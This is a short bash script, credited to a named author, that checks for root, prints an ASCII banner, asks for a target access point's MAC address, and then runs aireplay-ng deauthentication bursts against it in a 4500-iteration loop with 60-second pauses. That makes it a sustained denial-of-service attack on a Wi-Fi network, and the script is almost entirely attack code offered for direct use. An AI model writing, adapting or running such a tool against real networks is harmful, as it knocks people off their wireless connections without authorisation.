#!/bin/bash
#the tool should be run when you are in root 


if [ $EUID == 0 ]
 then
 
 sleep 2

echo -e "       =========================  "
 echo -e "=======Author:Meshack Kipngetich=============="
 echo -e "       =========================       "
 echo -e "  ____    ____    ___   ____                 "
 echo -e " |    \  /    |  |   | /   |              "
 echo -e " |     \/     |  |   |/   /               "
 echo -e " |   |\  /|   |  |   |   /_                "
 echo -e " |   | \/ |   |  |   |\    \              "
 echo -e " |___|    |___|  |___| \____\                 "
 echo -e ""
  
  sleep 2


read -p "AP Target mac address ?  " mac

 for i in {1..4500}
  do 
   aireplay-ng --deauth 1000 -a $mac wlan0mon
    
    sleep 60s
     
      done 
      
      
     else
     
     echo "You must be in root!!"
    
   
   fi
 
